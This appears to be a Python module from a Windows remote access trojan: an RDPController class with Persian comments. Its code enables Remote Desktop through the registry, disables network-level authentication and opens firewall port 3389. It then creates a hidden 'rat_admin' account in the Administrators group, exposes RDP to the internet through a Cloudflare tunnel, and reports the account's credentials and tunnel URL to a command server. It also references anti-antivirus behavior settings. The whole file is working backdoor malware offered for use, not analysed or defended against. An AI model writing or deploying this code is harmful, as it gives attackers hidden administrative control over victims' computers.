import logging
import os
import json
import socket
import subprocess
import uuid
import winreg
import requests
import ctypes
import time
import string
import random
import sys
import re
from typing import Dict, Optional, Any
from config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator

class RDPController:
    def __init__(self, encryption_manager: EncryptionManager):
        self.encryption = encryption_manager
        self.communicator = ServerCommunicator(Config.get_client_id(), encryption_manager)
        self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        self.password = ''.join(random.choice(chars) for _ in range(14))
        self.cloudflared_process = None
        self.tunnel_url = None
        self.rdp_wrapper_installed = False
        self.behavior = {"rdp_enabled": True}  # پیش‌فرض رفتار
        if Config.DEBUG_MODE:
            logging.info(f"RDPController initialized. User: {self.username}, Pass: {self.password[:4]}****")

    def _is_admin(self) -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            logging.error(f"Admin check error: {str(e)}")
            return False

    def _run_command(self, cmd: list, timeout: int = 30) -> Dict[str, str]:
        try:
            logging.debug(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = {
                "status": "success" if result.returncode == 0 else "error",
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip()
            }
            if "longer than 14 characters" in output['stderr']:
                output['stderr'] += "\n[WARN] Legacy Windows password restriction detected!"
            elif "The specified rule already exists" in output['stderr']:
                output['status'] = "success"
                output['stderr'] += "\n[INFO] Rule already exists"
            elif "Access is denied" in output['stderr']:
                output['stderr'] += "\n[ERROR] Insufficient permissions"
            logging.debug(f"Command result: {output}")
            return output
        except Exception as e:
            logging.error(f"Command execution crashed: {str(e)}")
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def _user_exists(self, username: str) -> bool:
        try:
            ps_command = f"Get-LocalUser -Name '{username}' -ErrorAction SilentlyContinue"
            result = self._run_command(["powershell", "-Command", ps_command])
            return result["status"] == "success" and username in result["stdout"]
        except Exception as e:
            logging.error(f"User check failed: {str(e)}")
            return False

    def _is_user_in_group(self, username: str, group: str) -> bool:
        try:
            ps_command = f"Get-LocalGroupMember -Group '{group}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name"
            result = self._run_command(["powershell", "-Command", ps_command])
            return result["status"] == "success" and username in result["stdout"]
        except Exception as e:
            logging.error(f"Group check failed: {str(e)}")
            return False

    def _start_service(self, service_name: str) -> bool:
        try:
            result = self._run_command(["sc", "query", service_name])
            if result["status"] == "success" and "RUNNING" not in result["stdout"]:
                logging.info(f"Starting service {service_name}...")
                result = self._run_command(["net", "start", service_name])
                if result["status"] != "success":
                    logging.error(f"Failed to start service {service_name}: {result['stderr']}")
                    return False
            logging.info(f"Service {service_name} is running")
            return True
        except Exception as e:
            logging.error(f"Service start failed: {str(e)}")
            return False

    def _configure_firewall(self) -> bool:
        logging.info("Configuring firewall rules for RDP...")
        cleanup_commands = [
            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"],
            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'AllowRDP' -ErrorAction SilentlyContinue"]
        ]
        for cmd in cleanup_commands:
            result = self._run_command(cmd)
            if result["status"] == "success":
                logging.info(f"Cleaned up firewall rule: {cmd[0]}")
            else:
                logging.debug(f"Cleanup command {cmd[0]} output: {result['stderr']}")
        methods = [
            {
                "type": "powershell_new",
                "cmd": [
                    "powershell", "-Command",
                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True"
                ],
                "validation": lambda: self._run_command(
                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
                )["status"] == "success"
            },
            {
                "type": "powershell_set",
                "cmd": [
                    "powershell", "-Command",
                    "if (Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue) { "
                    "Set-NetFirewallRule -DisplayName 'Allow RDP' -Enabled True -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any } else { "
                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True }"
                ],
                "validation": lambda: self._run_command(
                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
                )["status"] == "success"
            },
            {
                "type": "netsh",
                "cmd": [
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    "name=Allow RDP", "dir=in", "action=allow",
                    "protocol=TCP", "localport=3389", "profile=any", "enable=yes"
                ],
                "validation": lambda: "Enabled: Yes" in self._run_command(
                    ["netsh", "advfirewall", "firewall", "show", "rule", "name=Allow RDP"]
                )["stdout"]
            }
        ]
        for attempt in range(3):
            logging.info(f"Firewall configuration attempt {attempt+1}")
            for method in methods:
                try:
                    result = self._run_command(method["cmd"])
                    logging.debug(f"Firewall {method['type']} result: {result}")
                    if result["status"] == "success":
                        if method["validation"]():
                            logging.info(f"Firewall rule applied via {method['type']}")
                            return True
                        else:
                            logging.warning(f"Validation failed for {method['type']}: {result['stdout'][:100]}...")
                    else:
                        logging.warning(f"Failed to apply rule via {method['type']}: {result['stderr'][:100]}...")
                except Exception as e:
                    logging.error(f"Error in firewall method {method['type']}: {str(e)}")
                time.sleep(2)
        if self._check_port(3389):
            logging.info("Port 3389 is open despite firewall rule failure; proceeding")
            return True
        logging.error("All firewall configuration methods failed")
        return False

    def _create_user(self) -> bool:
        logging.info(f"Creating user {self.username}")
        if self._user_exists(self.username):
            logging.info(f"User {self.username} exists, resetting password...")
            result = self._run_command(["net", "user", self.username, self.password[:14]])
            if result["status"] == "success":
                return True
            logging.error(f"Failed to reset password: {result['stderr']}")
            return False
        methods = [
            {
                "type": "netuser",
                "cmd": ["net", "user", self.username, self.password[:14], "/add"],
                "validation": lambda: self._user_exists(self.username)
            },
            {
                "type": "powershell",
                "cmd": [
                    "powershell", "-Command",
                    f"$pass = ConvertTo-SecureString '{self.password}' -AsPlainText -Force; "
                    f"New-LocalUser -Name '{self.username}' -Password $pass -AccountNeverExpires -Description 'RDP User'"
                ],
                "validation": lambda: self._user_exists(self.username)
            }
        ]
        for method in methods:
            for attempt in range(3):
                result = self._run_command(method["cmd"])
                if result["status"] == "success" and method["validation"]():
                    logging.info(f"User created via {method['type']}")
                    return True
                logging.warning(f"User creation attempt {attempt+1} via {method['type']} failed: {result['stderr']}")
                time.sleep(1)
        logging.error("All user creation methods failed")
        return False

    def _configure_user_groups(self) -> bool:
        groups = ["Administrators", "Remote Desktop Users"]
        for group in groups:
            if not self._is_user_in_group(self.username, group):
                for attempt in range(3):
                    cmd = ["net", "localgroup", group, self.username, "/add"]
                    result = self._run_command(cmd)
                    if result["status"] == "success":
                        logging.info(f"Added {self.username} to {group}")
                        break
                    logging.warning(f"Failed to add to {group}, attempt {attempt+1}: {result['stderr']}")
                    time.sleep(1)
                else:
                    logging.error(f"Failed to add {self.username} to {group}")
                    return False
        return True

    def _enable_rdp_registry(self) -> bool:
        try:
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 1)
            reg_path_tcp = r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path_tcp, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "PortNumber", 0, winreg.REG_DWORD, 3389)
            result = self._run_command([
                "reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                "/v", "UserAuthentication", "/t", "REG_DWORD", "/d", "0", "/f"
            ])
            if result["status"] == "success":
                logging.info("NLA disabled for RDP compatibility")
            result = self._run_command(["gpupdate", "/force"])
            if result["status"] == "success":
                logging.info("Group Policy updated")
            else:
                logging.warning(f"Group Policy update failed: {result['stderr']}")
            logging.info("RDP enabled in registry")
            return True
        except Exception as e:
            logging.error(f"Registry error: {str(e)}")
            return False

    def _check_port(self, port: int) -> bool:
        try:
            for attempt in range(3):
                result = self._run_command(["netstat", "-an"])
                if result["status"] == "success" and f":{port}" in result["stdout"] and "LISTENING" in result["stdout"]:
                    logging.info(f"Port {port} is open")
                    return True
                logging.debug(f"Port check attempt {attempt+1} failed")
                time.sleep(2)
            logging.warning(f"Port {port} is not open")
            return False
        except Exception as e:
            logging.error(f"Port check failed: {str(e)}")
            return False

    def _configure_cloudflare_hostname(self) -> bool:
        try:
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(__file__)
            cloudflared_path = os.path.join(base_path, Config.CLOUDFLARE_BINARY)
            if not os.path.exists(cloudflared_path):
                logging.error(f"Cloudflared binary not found at {cloudflared_path}")
                return False
            if not Config.CLOUDFLARE_SUBDOMAIN or not Config.CLOUDFLARE_DOMAIN or not Config.CLOUDFLARE_TUNNEL_TOKEN:
                logging.error("Cloudflare subdomain, domain, or tunnel token missing in config")
                return False
            hostname = f"{Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}"
            cloudflared_cmd = [
                cloudflared_path, "tunnel", "route", "dns",
                "rdp-tunnel", hostname
            ]
            result = self._run_command(cloudflared_cmd)
            if result["status"] != "success":
                logging.error(f"Failed to configure Cloudflare hostname: {result['stderr']}")
                return False
            logging.info(f"Cloudflare hostname configured: {hostname}")
            return True
        except Exception as e:
            logging.error(f"Cloudflare hostname configuration error: {str(e)}")
            return False

    def _start_cloudflare_tunnel(self) -> Optional[str]:
        try:
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(__file__)
            cloudflared_path = os.path.join(base_path, Config.CLOUDFLARE_BINARY)
            if not os.path.exists(cloudflared_path):
                logging.error(f"Cloudflared binary not found at {cloudflared_path}")
                return None
            config_path = os.path.join(base_path, "cloudflared_config.yml")
            config_content = f"""
tunnel: rdp-tunnel
credentials-file: {os.path.join(base_path, 'cloudflared_creds.json')}
protocol: http2
ingress:
  - hostname: {Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}
    service: rdp://localhost:3389
  - service: http_status:404
"""
            with open(config_path, "w") as f:
                f.write(config_content)
            creds_content = {"AccountTag": "", "TunnelSecret": Config.CLOUDFLARE_TUNNEL_TOKEN, "TunnelID": "rdp-tunnel"}
            with open(os.path.join(base_path, "cloudflared_creds.json"), "w") as f:
                json.dump(creds_content, f)
            cloudflared_cmd = [cloudflared_path, "tunnel", "--config", config_path, "run"]
            self.cloudflared_process = subprocess.Popen(
                cloudflared_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            hostname = f"{Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}"
            start_time = time.time()
            timeout = 30
            while time.time() - start_time < timeout:
                try:
                    response = requests.get(f"https://{hostname}/", timeout=5)
                    if response.status_code in [200, 404]:
                        logging.info(f"Cloudflare tunnel started: https://{hostname}")
                        return f"https://{hostname}"
                except requests.RequestException:
                    pass
                time.sleep(2)
            logging.error("Cloudflare tunnel failed to start within timeout")
            self._stop_cloudflare_tunnel()
            return None
        except Exception as e:
            logging.error(f"Cloudflare tunnel error: {str(e)}")
            self._stop_cloudflare_tunnel()
            return None

    def _stop_cloudflare_tunnel(self):
        if self.cloudflared_process:
            try:
                self.cloudflared_process.terminate()
                self.cloudflared_process.wait(timeout=5)
                logging.info("Cloudflare tunnel stopped")
            except Exception as e:
                logging.error(f"Failed to stop Cloudflare tunnel: {str(e)}")
            self.cloudflared_process = None
            self.tunnel_url = None

    def update_behavior(self, behavior: Dict):
        """
        به‌روزرسانی تنظیمات رفتار (مثل rdp_enabled) از AntiAV یا سرور
        """
        self.behavior.update(behavior)
        if Config.DEBUG_MODE:
            logging.info(f"RDPController behavior updated: {self.behavior}")

    def enable_rdp(self) -> Dict[str, Any]:
        if not self.behavior["rdp_enabled"]:
            logging.info("RDP disabled by AntiAV behavior settings")
            return {
                "status": "error",
                "message": "RDP disabled by AntiAV",
                "username": None,
                "password": None,
                "tunnel_url": None
            }
        if not self._is_admin():
            logging.error("Administrator privileges required to enable RDP")
            return {
                "status": "error",
                "message": "Administrator privileges required",
                "username": None,
                "password": None,
                "tunnel_url": None
            }
        try:
            logging.info("Starting RDP enable process...")
            if not self._enable_rdp_registry():
                return {
                    "status": "error",
                    "message": "Failed to enable RDP in registry",
                    "username": None,
                    "password": None,
                    "tunnel_url": None
                }
            if not self._start_service("TermService"):
                return {
                    "status": "error",
                    "message": "Failed to start Terminal Services",
                    "username": None,
                    "password": None,
                    "tunnel_url": None
                }
            if not self._configure_firewall():
                return {
                    "status": "error",
                    "message": "Failed to configure firewall",
                    "username": None,
                    "password": None,
                    "tunnel_url": None
                }
            if not self._create_user():
                return {
                    "status": "error",
                    "message": "Failed to create user",
                    "username": None,
                    "password": None,
                    "tunnel_url": None
                }
            if not self._configure_user_groups():
                return {
                    "status": "error",
                    "message": "Failed to configure user groups",
                    "username": None,
                    "password": None,
                    "tunnel_url": None
                }
            if not self._configure_cloudflare_hostname():
                logging.warning("Cloudflare hostname configuration failed; attempting tunnel without hostname")
            self.tunnel_url = self._start_cloudflare_tunnel()
            if not self.tunnel_url:
                logging.warning("Cloudflare tunnel not started; RDP may still work locally")
            tunnel_info = {
                "client_id": Config.get_client_id(),
                "username": self.username,
                "password": self.password,
                "tunnel_url": self.tunnel_url,
                "local_ip": socket.gethostbyname(socket.gethostname()),
                "port": 3389,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            try:
                self.communicator.report_rdp_tunnel(tunnel_info)
                logging.info("RDP tunnel info reported to server")
            except Exception as e:
                logging.error(f"Failed to report RDP tunnel: {str(e)}")
            logging.info("RDP enabled and configured successfully")
            return {
                "status": "success",
                "message": "RDP enabled successfully",
                "username": self.username,
                "password": self.password,
                "tunnel_url": self.tunnel_url
            }
        except Exception as e:
            logging.error(f"Enable RDP error: {str(e)}")
            return {
                "status": "error",
                "message": f"Failed to enable RDP: {str(e)}",
                "username": None,
                "password": None,
                "tunnel_url": None
            }

    def disable_rdp(self) -> Dict[str, Any]:
        try:
            logging.info("Starting RDP disable process...")
            self._stop_cloudflare_tunnel()
            try:
                reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
                logging.info("RDP disabled in registry")
            except Exception as e:
                logging.error(f"Registry disable error: {str(e)}")
            cleanup_commands = [
                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
                ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"],
                ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'AllowRDP' -ErrorAction SilentlyContinue"]
            ]
            for cmd in cleanup_commands:
                result = self._run_command(cmd)
                if result["status"] == "success":
                    logging.info(f"Cleaned up firewall rule: {cmd[0]}")
                else:
                    logging.debug(f"Cleanup command failed: {result['stderr']}")
            if self._user_exists(self.username):
                result = self._run_command(["net", "user", self.username, "/delete"])
                if result["status"] == "success":
                    logging.info(f"User {self.username} deleted")
                else:
                    logging.error(f"Failed to delete user: {result['stderr']}")
            logging.info("RDP disabled successfully")
            return {
                "status": "success",
                "message": "RDP disabled successfully",
                "username": None,
                "password": None,
                "tunnel_url": None
            }
        except Exception as e:
            logging.error(f"Disable RDP error: {str(e)}")
            return {
                "status": "error",
                "message": f"Failed to disable RDP: {str(e)}",
                "username": None,
                "password": None,
                "tunnel_url": None
            }

    def start(self):
        if not self.behavior["rdp_enabled"]:
            logging.info("RDP start skipped due to AntiAV behavior settings")
            return
        result = self.enable_rdp()
        if result["status"] == "success":
            logging.info("RDP started successfully")
        else:
            logging.error(f"Failed to start RDP: {result['message']}")